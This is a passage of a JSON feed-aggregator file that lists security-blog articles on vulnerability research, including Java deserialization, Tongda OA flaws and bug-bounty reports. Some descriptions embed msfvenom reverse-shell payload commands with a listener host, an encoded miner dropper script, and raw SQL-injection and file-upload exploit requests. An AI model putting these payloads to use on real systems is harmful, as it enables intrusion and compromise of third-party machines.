          "description": "从零开始搭建本地安全 AI 大模型攻防知识库",
          "link": "https://govuln.com/news/url/7RKO",
          "publishedOn": "2024-08-07T09:57:52.376Z",
          "wordCount": null,
          "title": "从零开始搭建本地安全 AI 大模型攻防知识库",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/21Pp",
          "author": null,
          "description": "Becoming any Android app via Zygote command injection",
          "link": "https://govuln.com/news/url/21Pp",
          "publishedOn": "2024-07-30T16:14:55.442Z",
          "wordCount": 4676,
          "title": "Becoming any Android app via Zygote command injection",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/DoAM",
          "author": null,
          "description": "JNDI Injection Remote Code Execution via Path Manipulation in MemoryUserDatabaseFactory",
          "link": "https://govuln.com/news/url/DoAM",
          "publishedOn": "2024-07-25T16:19:29.544Z",
          "wordCount": 1838,
          "title": "JNDI Injection Remote Code Execution via Path Manipulation in MemoryUserDatabaseFactory",
          "imageUrl": null
        },
        {
          "id": "https://govuln.com/news/url/WQbG",
          "author": null,
          "description": "CVE-2024-36401 JDK 11-22 通杀内存马",
          "link": "https://govuln.com/news/url/WQbG",
          "publishedOn": "2024-07-25T07:44:26.950Z",
          "wordCount": 39489,
          "title": "CVE-2024-36401 JDK 11-22 通杀内存马",
          "imageUrl": "https://mmbiz.qpic.cn/mmbiz_jpg/vlekRjgqic0exB4eGsmEK5her4xibskb0ZXpxHUE1icSptWS4QOMA9yUzGUm9l2dK0ptM66uCNPOibeECkc2A2pTGg/0?wx_fmt=jpeg"
        },
        {
          "id": "https://govuln.com/news/url/yZd4",
          "author": null,
          "description": "wb近期流传漏洞-验真情报合集",
          "link": "https://govuln.com/news/url/yZd4",
          "publishedOn": "2024-07-24T09:22:29.573Z",
          "wordCount": 1932,
          "title": "wb近期流传漏洞-验真情报合集",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "0e0w",
      "feedUrl": "https://0e0w.com/feed.xml",
      "siteUrl": "https://0e0w.com/",
      "articles": [
        {
          "id": "https://0e0w.com/CodeQL",
          "author": null,
          "description": "01-CodeQL概述\n01-CodeQL概述\nhttp://www.0e0w.com",
          "link": "https://0e0w.com/CodeQL",
          "publishedOn": "2022-03-23T00:00:00.000Z",
          "wordCount": 205,
          "title": "深入理解CodeQL",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/2023vul",
          "author": null,
          "description": "2022年高危漏洞统计列表\n2022年高危漏洞统计列表\n2023-01-06 19:17 –>01-有详情#禅道研发项目管理系统命令注入漏洞#0day",
          "link": "https://0e0w.com/2023vul",
          "publishedOn": "2022-01-01T00:00:00.000Z",
          "wordCount": 210,
          "title": "2023年高危漏洞",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/2021hw",
          "author": null,
          "description": "2021年H.y.v漏洞汇总\n2021年H.y.v漏洞汇总\n2021-04-20  14:58 –>01-有详情#奇安信天擎前台SQL注入getshell#1day\n2021-04-10  09:06 –>02-有详情#奇安信天擎越权访问漏洞#nday\n2021-04-08  12:07 –>03-有详情#默安蜜罐未授权访问漏洞#1day\n2021-04-10  09:40 –>04-有详情#帆软OA任意文件覆盖getshell#0day\n2021-04-11  08:26 –>05-有详情#和信创天下一代云桌面文件上传漏洞#0day\n2021-04-11  16:05 –>06-有详情#泛微OA9 前台无限制Getshell#1day\n2021-04-11  09:15 –>07-有详情#泛微OA8 前台SQL注入#1day\n2021-04-10  09:15 –>08-有详情#用友 GRP-u8 SQL注入#1day\n2021-04-10  09:14 –>09-有详情#蓝凌OA任意写入漏洞#1day\n2021-04-09  14:52 –>10-有详情#dzzoffice 前台RCE漏洞#1day\n2021-04-09  14:52 –>11-无详情#Tomcat某版本存在反序列化漏洞\n2021-04-09  15:06 –>12-无详情#Shiro反序列化漏洞\n2021-04-22  09:08 –>13-有详情#WebLogicT3反序列化RCE漏洞@0day\n2021-04-12  18:38 –>14-有详情#亿邮邮件系统RCE漏洞#0day\n2021-04-11  16:06 –>15-无详情#Jeecms前台无条件RCE漏洞\n2021-04-09  20:43 –>16-有详情#用友NC6.5未授权文件上传漏洞#1day\n2021-04-10  10:03…",
          "link": "https://0e0w.com/2021hw",
          "publishedOn": "2021-05-05T00:00:00.000Z",
          "wordCount": 522,
          "title": "2021年H.y.v漏洞汇总",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/2021vul",
          "author": null,
          "description": "2021年高危漏洞统计列表\n2021年高危漏洞统计列表\n1001#Dedecms未授权RCE漏洞。参考\n0626#宝塔linux面板 <6.0 存储型XSS漏洞\n0625#多家防火墙设备存在信息泄露漏洞\n0622#小额贷款系统存在0day漏洞可以Getshell\n0610#蓝凌OA前台任意文件读取漏洞\n0610#蓝凌OA低权限用户后台Getshell\n0610#CNVD-2021-34249-用友NC Cloud存在SQL注入漏洞\n0610#万户OA前台Getshell\n0606#SharePoint文件上传Getshell\n0601#用友NC bsh.servlet.BshServlet 远程命令执行漏洞\n0416#亿邮V8.3-V8.13存在命令执行漏洞\nHW2021高危漏洞汇总集合\n0323#CVE-2021-21087-Adobe ColdFusion RCE\n0323#CVE-2021-26295-OFBiz反序列化漏洞\n0318#Apache Solr存在任意文件读取漏洞\n0311#F5 Networks多个远程代码执行漏洞\n0304#CVE-2021-21978-VMware View Planner未授权RCE漏洞\n0301#锐捷SSL VPN 越权访问漏洞\n0225#CVE-2021-1388-Cisco ACI MSO API身份验证绕过漏洞\n0224#CVE-2021-21315-Node.js命令注入漏洞\n0224#CVE-2021-21972-VMware vCenter Server未授权RCE漏洞\n0207#CVE-2020-13924-Apache Ambari任意文件下载漏洞\n0207#Apache Skywalking GraphQL 注入与远程代码执行漏洞\n0201#CVE-2021-25646-Druid远程代码执行漏洞\n0201#CVE-2020-17523-Apache Shiro验证绕过漏洞\n0129#若依后台管理框架存在任意文件读取漏洞。参考\n0121#CVE-2020-36193-Drupal存在目录遍历漏洞\n0110#致远OA ajaxAction formulaManager文件上传漏洞",
          "link": "https://0e0w.com/2021vul",
          "publishedOn": "2021-01-01T00:00:00.000Z",
          "wordCount": 260,
          "title": "2021年高危漏洞",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/Docker",
          "author": null,
          "description": "01-Docker介绍\n02-Docker架构\nDocker官网。\n\n\n01-Docker介绍\n02-Docker架构",
          "link": "https://0e0w.com/Docker",
          "publishedOn": "2020-07-30T00:00:00.000Z",
          "wordCount": 288,
          "title": "深入理解Docker",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/SystemdMiner",
          "author": null,
          "description": "01-基本概述\n02-样本分析\n03-传播方式\n04-木马清理\n05-追踪溯源\n06-参考链接\n01-基本概述\n02-样本分析\n\n-rwxr-xr-x.  1 root root    1468 Aug 12  2017 .ryukd.sh\n\n    \n\n[root@192 ~]# cat .ryukd.sh \n#!/bin/bash\nexec &>/dev/null\necho CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE\necho Q2dSdmx1aStyUGtpQ3E3ZmdhclpuZTNhSTU0Q3o3MXVnZDhuUE1uR2V1Z294Zy9nUlpGQkF3Z3h6dEdxRjd4RQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJyeXVrZHNzdXNrb3ZobndiIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5…",
          "link": "https://0e0w.com/SystemdMiner",
          "publishedOn": "2020-06-18T00:00:00.000Z",
          "wordCount": 473,
          "title": "SystemdMiner挖矿事件分析",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/msfvenom",
          "author": null,
          "description": "01-msfvenom概述    \n基础介绍\n安装方式\n02-msfvenom命令\n03-msfvenom利用    \nWindows exe\nLinux elf\nPython\nPHP\nAndroid\napple_ios\n04-参考链接\nmsfvenom官网和如何使用。\n\n\n01-msfvenom概述\n基础介绍\n安装方式\n02-msfvenom命令\nmsfvenom -h #查看帮助\nmsfvenom -l payloads #查看支持生成的payload\nmsfvenom -l archs #查看支持的系统架构\nmsfvenom -l platforms #查看支持的平台\nmsfvenom -l encrypt #查看所有的加密方式\nmsfvenom -l encoders #查看所有的编码器\n03-msfvenom利用\nMSF监听器\n\n\n  \nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp #设置成payload的模式\nset rhost 111.111.111.112\nset lport 6095\nexploit -j\nsessions操作\n\n\n  \nsessions -i 2\nshell\nWindows exe\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.112 lport=6095 -f exe -o x86reverse_tcp.exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=111.111.111.112 lport=6095 -f exe -o x64reverse_tcp.exe\nmsfvenom -p windows/x64/meterpreter/bind_tcp lport=6095 -f exe -o bind_tcp.exe\nLinux elf\nPython\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.112 lport=6095 -f py -o x86reverse_tcp.py\nmsfvenom ­-p windows/x64/meterpreter/bind_tcp lport=6095 ­-f py -o exp.py\nPHP\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=111.111.111.112 LPORT=6095 -f raw -o session.php\nAndroid\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=111.111.111.112 LPORT=80 -o msf.apk\napple_ios\n\n\n\n04-参考链接\nhttps://blog.csdn.net/caiqiiqi/article/details/84102629",
          "link": "https://0e0w.com/msfvenom",
          "publishedOn": "2020-06-04T00:00:00.000Z",
          "wordCount": 387,
          "title": "内网渗透之msfvenom",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/t303",
          "author": null,
          "description": "01-漏洞概述\n02-漏洞分析    \n一、payload\n二、代码审计\n三、漏洞修复\n03-参考链接\n官网。\n\n\n01-漏洞概述\n02-漏洞分析\n影响版本：< 通达OA11.6\n发现时间：2020-04-01\n一、payload\n\nPOST /general/appbuilder/web/meeting/meetingapply/getmeetingapplyinfo HTTP/1.1\nHost: 192.168.220.129\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169\nContent-Length: 183\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/x-www-form-urlencoded\nCookie: USER_NAME_COOKIE=lina; SID_1=3b9b2a17; SID_12=6114b1ec; SID_65=dba4163e; PHPSESSID=e62i1gqidh35cb4pfbn3eatn84; OA_USER_ID=65; creat_work=new\nOrigin: http://192.168.220.129\nReferer: http://192.168.220.129/general/meeting/myapply/applyMeeting/select1.php\nX-Requested-With: XMLHttpRequest\nAccept-Encoding: gzip\n\ndate=2020-04-01&end_time=&equipment_ids=&keyword=*&max_people=&min_people=&start_time=\n\n\n二、代码审计\n\n\t\t$pageSize = modules\\meeting\\models\\intval($data[\"pageSize\"]);\n\t\t$type = $data[\"type\"];\n\t\t$keyword = $data[\"keyword\"];\n  \n\t\tif ($keyword != \"\") {\n\t\t\t$key_where = array(\"like\", \"M_NAME\", \"$keyword\");\n\t\t}\n\n    \n\n\t\t$where = \" 1=1\";\n\t\tif (isset($mr_id) && !empty($mr_id)) {\n\t\t\t$where .= \" and MR_ID = '$mr_id'\";\n\t\t}\n  \n\t\tif (isset($keyword) && !empty($keyword)) {\n\t\t\t$where .= \" and MR_NAME like '%\" . $keyword . \"%'\";\n\t\t}\n  \n\t\tif (isset($min_people) && !empty($min_people)) {\n\t\t\t$where .= \" and MR_CAPACITY >= $min_people\";\n\t\t}\n  \n\t\tif (isset($max_people) && !empty($max_people)) {\n\t\t\t$where .= \" and MR_CAPACITY <= $max_people\";\n\t\t}\n  \n\t\t$sql1 = \"SELECT * from Meeting_room where (TO_ID='ALL_DEPT' or find_in_set('$login_dept_id',TO_ID) or find_in_set('$login_user_id',SECRET_TO_ID) or find_in_set('$login_priv_id',PRIV_ID)) and USE_FLAG = '1' and\" . $where;\n\t\t$cur = self::getDb()->createCommand($sql1)->queryAll();\n\n    \n三、漏洞修复\n\n$keyword = $data[\"keyword\"];\n\n\n\n$keyword = modules\\meeting\\models\\intval($data[\"keyword\"]);\n\n\n03-参考链接\nhttps://www.0e0w.com",
          "link": "https://0e0w.com/t303",
          "publishedOn": "2020-06-02T00:00:00.000Z",
          "wordCount": 383,
          "title": "通达OA11.5SQL注入分析",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/t302",
          "author": null,
          "description": "01-漏洞概述\n02-漏洞分析    \n一、文件上传\n二、文件包含\n三、漏洞修复\n03-参考链接\n官网。\n\n\n01-漏洞概述\n\nPOST /ispirit/im/upload.php HTTP/1.1\nHost: 192.168.220.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nCache-Control: no-cache\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB\nAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5\nCookie: PHPSESSID=123\nContent-Length: 658\n\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\n\n2\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"P\"\n\n123\n------WebKitFormBoundarypyfBh1YB4pV8McGB\nContent-Disposition: form-data; name=\"DES…",
          "link": "https://0e0w.com/t302",
          "publishedOn": "2020-06-02T00:00:00.000Z",
          "wordCount": 462,
          "title": "通达OA文件包含漏洞",
          "imageUrl": null
        },
        {
          "id": "https://0e0w.com/t301",
          "author": null,
          "description": "01-漏洞概述\n02-漏洞分析    \n一、Payload\n二、代码审计\n三、漏洞修复\n03-参考链接\n官网。\n\n\n01-漏洞概述\n02-漏洞分析\n影响版本：通达OA2017、V11.X<V11.5\n发现时间：2020-04-01\n一、Payload\n\nGET /general/login_code.php HTTP/1.1\nHost: 192.168.220.129\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\n\n\n\nGET /ispirit/login_code.php HTTP/1.1\nHost: 192.168.220.129\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\n\n\n\nPOST /logincheck_code.php HTTP/1.1\nHost: 192.168.220.129\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: clo…",
          "link": "https://0e0w.com/t301",
          "publishedOn": "2020-06-02T00:00:00.000Z",
          "wordCount": 484,
          "title": "通达OA越权登录漏洞分析",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "wh1t3p1g's blog",
      "feedUrl": "https://blog.0kami.cn/feed_rss_created.xml",
      "siteUrl": "https://blog.0kami.cn/",
      "articles": [
        {
          "id": "https://blog.0kami.cn/",
          "author": null,
          "description": "happy hunting bugs",
          "link": "https://blog.0kami.cn/",
          "publishedOn": "2024-01-30T06:54:11.000Z",
          "wordCount": 293,
          "title": "Home",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/about/",
          "author": null,
          "description": "About Me\nA program analysis enthusiasts 😄\nA researcher on java code review (semi-auto and manual) and redteam 🤔\nA former ctfer at NeSE 🍵\nAnd currently ...",
          "link": "https://blog.0kami.cn/about/",
          "publishedOn": "2024-01-30T06:54:11.000Z",
          "wordCount": 283,
          "title": "About Me",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/",
          "author": null,
          "description": "0x01 前言\n\nthymeleaf 模版对于 SpEL 表达式的解析具有黑名单上的类型检查（最早追溯到什么时间暂时没找到）\n在 2023.07 thymeleaf 出了个沙箱绕过的漏洞 CVE-2023-38286，影响版本是 3.1.1.RELEASE。这个沙盒绕过可以追溯到 [spring a...",
          "link": "https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/",
          "publishedOn": "2024-01-30T06:54:11.000Z",
          "wordCount": 797,
          "title": "Thymeleaf ssti 3.1.2 黑名单绕过",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/",
          "author": null,
          "description": "Java\n\nStruts2命令执行各版本记录\n[Java反序列化利用链挖掘之CommonsCollections1](blog/2019/study-java-d...",
          "link": "https://blog.0kami.cn/",
          "publishedOn": "2024-01-30T06:54:11.000Z",
          "wordCount": 293,
          "title": "Home",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/",
          "author": null,
          "description": "#1 前言\n这几天，ofbiz 出了一个认证绕过导致的 xml-rpc 反序列化漏洞。在复现过程中，发现用 tabby 跑实际的漏洞链路会非常长，导致无法在个人电脑上完成利用链的检索。\n本文将讨论 tabby 的另一种规则扩展方法，使得在个人机器上遇到函数调用链路过深的情况也可以查询出对应的漏洞链路。...",
          "link": "https://blog.0kami.cn/blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/",
          "publishedOn": "2023-12-06T00:00:00.000Z",
          "wordCount": 539,
          "title": "【tabby 案例随笔】XML-RPC RCE CVE-2023-49070",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/",
          "author": null,
          "description": "前言\n\n最近开始运营 tabby 的相关规则库，后续会有一些类似的使用 tabby 分析漏洞的随笔。\n\n在 11 月初，微软安全团队披露了 Lace Tempest 黑客团队利用 SysAid 软件的 0day 漏洞 (CVE-2023-47246)进行勒索软件分发的安全事件。后续，github 上也出...",
          "link": "https://blog.0kami.cn/blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/",
          "publishedOn": "2023-12-05T00:00:00.000Z",
          "wordCount": 313,
          "title": "【tabby 案例随笔】sysaid CVE-2023-47246",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/",
          "author": null,
          "description": "#0 前言\n应用程序分析技术挖掘应用漏洞一直以来都是学术界和工业界的研究重点之一。从最初的正则匹配到最近的代码属性图挖掘方案，国内外有很多来自不同阶段的安全工具或商业产品来发掘程序代码的安全问题。在 Java 语言方面，业界已经有了不少出色的产品，如 CodeQL 等，但是，多数产品考虑的角度是从甲方视角或...",
          "link": "https://blog.0kami.cn/blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/",
          "publishedOn": "2023-01-11T00:00:00.000Z",
          "wordCount": 817,
          "title": "基于代码属性图的自动化漏洞挖掘实践",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/",
          "author": null,
          "description": "#1 前言\nJava反序列化利用链一直都是国内外研究热点之一，但当前自动化方案gadgetinspector的效果并不好。所以目前多数师傅仍然是以人工+自研小工具的方式进行利用链的挖掘。目前我个人也在找一个合适的方法来高效挖掘利用链，本文将主要介绍我自己的一些挖掘心得，辅以XStream反序列化利用链CVE-2021-21346为例。",
          "link": "https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/",
          "publishedOn": "2021-03-14T00:00:00.000Z",
          "wordCount": 752,
          "title": "如何高效的挖掘Java反序列化利用链？",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/",
          "author": null,
          "description": "#1 前言\n之前在文章 如何高效地挖掘 Java 反序列化利用链 中提到了我是如何高效挖掘利用链的，这其中提到了工具 tabby 。\n目前，tabby 开源也有一段时间了，这段时间里有不少小伙伴问我如何在实际环境中更好地使用它？\n为此，本文将介绍我是如何利用 tabby 捡漏 XStream CVE-2021-39147 && CVE-2021-39148 。",
          "link": "https://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/",
          "publishedOn": "2021-03-14T00:00:00.000Z",
          "wordCount": 577,
          "title": "如何高效地捡漏反序列化利用链？",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/",
          "author": null,
          "description": "#1 Gadget Overview\nRecently, I found a new deserialzation gadget which can bypass the latest version of XStream. This gadget use the JDK to construct the gadget chain. I had tested the gadget chain to RCE (remote code execute) with the version of JDK8 (8u162). I think other version of JDK also could trigger this vulnerablity to the RCE.",
          "link": "https://blog.0kami.cn/blog/2021/xstream_blacklist_bypass/",
          "publishedOn": "2021-01-03T00:00:00.000Z",
          "wordCount": 1012,
          "title": "XStream 1.4.15 Blacklist Bypass",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/writeups/2020/xnuca-2020-easyjava/",
          "author": null,
          "description": "0x00 前言\neasyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。",
          "link": "https://blog.0kami.cn/writeups/2020/xnuca-2020-easyjava/",
          "publishedOn": "2020-11-02T00:00:00.000Z",
          "wordCount": 560,
          "title": "xnuca2020 easyjava设计思路",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/talk_about_struts2/",
          "author": null,
          "description": "0x00 前言\n\n17年的时候整理过struts2相关的POC，时隔3年，虽然struts2已经不再那么流行了，但是还是有很大的研究价值，本文将一点一点跟一下struts2 有价值的漏洞XD",
          "link": "https://blog.0kami.cn/blog/2020/talk_about_struts2/",
          "publishedOn": "2020-05-22T00:00:00.000Z",
          "wordCount": 1204,
          "title": "struts2历史漏洞分析",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/talk-about-xstream-deserialization-20200418/",
          "author": null,
          "description": "0x00 前言\n\nXStream也是一款用的比较多的序列化组件，可以将object转化为XML并能完整的还原回来。他也曾经出现过反序列化漏洞，本文主要整理XStream相关的安全问题XD",
          "link": "https://blog.0kami.cn/blog/2020/talk-about-xstream-deserialization-20200418/",
          "publishedOn": "2020-04-18T00:00:00.000Z",
          "wordCount": 670,
          "title": "回顾XStream反序列化漏洞",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/talk-about-fastjson-deserialization-20200413/",
          "author": null,
          "description": "0x00 前言\n最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。",
          "link": "https://blog.0kami.cn/blog/2020/talk-about-fastjson-deserialization-20200413/",
          "publishedOn": "2020-04-13T00:00:00.000Z",
          "wordCount": 786,
          "title": "浅谈fastjson反序列化漏洞",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/java-jmx-rmi-20200310/",
          "author": null,
          "description": "0x00 前言\nRMI的一个重要应用是JMX(Java Management Extentions)，本文介绍JMX的两个攻击面：）",
          "link": "https://blog.0kami.cn/blog/2020/java-jmx-rmi-20200310/",
          "publishedOn": "2020-03-10T00:00:00.000Z",
          "wordCount": 759,
          "title": "攻击Java JMX-RMI",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/jndi-with-ldap-20200301/",
          "author": null,
          "description": "0x00 前言\nJNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager，本文将讲述JNDI使用ldap协议的两个攻击面XD",
          "link": "https://blog.0kami.cn/blog/2020/jndi-with-ldap-20200301/",
          "publishedOn": "2020-03-01T00:00:00.000Z",
          "wordCount": 503,
          "title": "JNDI with LDAP",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/jndi-with-rmi-20200209/",
          "author": null,
          "description": "0x00 前言\n在现实环境中，遇到RMI Registry的机会很少，而结合反序列化漏洞的JNDI注入则常见了许多。本文将介绍RMI结合JNDI后可以做哪些事情XD",
          "link": "https://blog.0kami.cn/blog/2020/jndi-with-rmi-20200209/",
          "publishedOn": "2020-02-09T00:00:00.000Z",
          "wordCount": 991,
          "title": "JNDI with RMI",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/",
          "author": null,
          "description": "0x00 前言\n本文讲述了Java RMI Registry相关的反序列化问题，主讲Registry，后续补充了Client端和Server端的利用",
          "link": "https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/",
          "publishedOn": "2020-02-06T00:00:00.000Z",
          "wordCount": 537,
          "title": "浅谈Java RMI Registry安全问题",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2019/study-java-deserialized-shiro-1-2-4-20191110/",
          "author": null,
          "description": "0x00 前言\n在跟了一遍commons-collections系列的payload后，终于可以开始解决一下当时对shiro反序列化模凌两可的认识了。",
          "link": "https://blog.0kami.cn/blog/2019/study-java-deserialized-shiro-1-2-4-20191110/",
          "publishedOn": "2019-11-10T00:00:00.000Z",
          "wordCount": 531,
          "title": "Java反序列化利用链挖掘之Shiro反序列化",
          "imageUrl": null
        },
        {
          "id": "https://blog.0kami.cn/blog/2019/study-java-deserialized-commonscollections4-20191105/",
          "author": null,
          "description": "0x00 前言\n前面几篇文章，分析了CommonsCollections:3.2.1版本以下存在的反序列化链。今天将继续分析CommonsCollections:4.0版本，主要讲述CommonsCollections2，4，8的利用链构造。",
          "link": "https://blog.0kami.cn/blog/2019/study-java-deserialized-commonscollections4-20191105/",
          "publishedOn": "2019-11-05T00:00:00.000Z",
          "wordCount": 361,
          "title": "Java反序列化利用链挖掘之CommonsCollections2,4,8",
          "imageUrl": null
        }
      ]
    },
    {
      "title": "0xacb",
      "feedUrl": "https://0xacb.com/feed.xml",
      "siteUrl": "https://0xacb.com/",
      "articles": [
        {
          "id": "https://0xacb.com/2023/04/26/git-arbitrary-config-injection-cve-2023-29007/",
          "author": null,
          "description": "Please check the blog post here: https://blog.ethiack.com/en/blog/git-arbitrary-configuration-injection-cve-2023-29007",
          "link": "https://0xacb.com/2023/04/26/git-arbitrary-config-injection-cve-2023-29007/",
          "publishedOn": "2023-04-26T00:00:00.000Z",
          "wordCount": 63,
          "title": "Git Arbitrary Configuration Injection",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2022/11/21/recollapse/",
          "author": null,
          "description": "Welcome back to my blog. In this post, I’ll explain the REcollapse technique. I’ve been researching it for the last couple of years to discover weirdly simple but impactful vulnerabilities in hardened targets while doing bug bounties and participating in HackerOne LHEs. This technique can be used to perform zero-interaction account takeovers, uncover new bypasses for web application firewalls, and more.",
          "link": "https://0xacb.com/2022/11/21/recollapse/",
          "publishedOn": "2022-11-21T00:00:00.000Z",
          "wordCount": 1256,
          "title": "Till REcollapse",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2019/03/15/steam-rce/",
          "author": null,
          "description": "This report has been disclosed on HackerOne: https://hackerone.com/reports/470520",
          "link": "https://0xacb.com/2019/03/15/steam-rce/",
          "publishedOn": "2019-03-15T00:00:00.000Z",
          "wordCount": 81,
          "title": "RCE on Steam Client via buffer overflow in Server Info",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2018/12/04/github-desktop-rce/",
          "author": null,
          "description": "I was invited to H1-702 2018, a HackerOne live-hacking event in Las Vegas that paid over $500k dollars in bounties. One of the targets of this event was GitHub. I like to hack software I use everyday, because I already know lots of features in advance, so I felt GitHub would be a good target. I started playing with GitHub Desktop and found a way to achieve RCE in OSX. But, guess what? It was out of scope for the event! It’s also out of scope in the normal program, but you can read that “occasionally, exceptional reports are rewarded at our discretion on a case by case basis.”",
          "link": "https://0xacb.com/2018/12/04/github-desktop-rce/",
          "publishedOn": "2018-12-04T00:00:00.000Z",
          "wordCount": 643,
          "title": "GitHub Desktop RCE (OSX)",
          "imageUrl": null
        },
        {
          "id": "https://0xacb.com/2018/05/23/shopify-ssrf-to-rce/",
          "author": null,
          "description": "This report has been disclosed on HackerOne: https://hackerone.com/reports/341876",
          "link": "https://0xacb.com/2018/05/23/shopify-ssrf-to-rce/",
          "publishedOn": "2018-05-23T00:00:00.000Z",
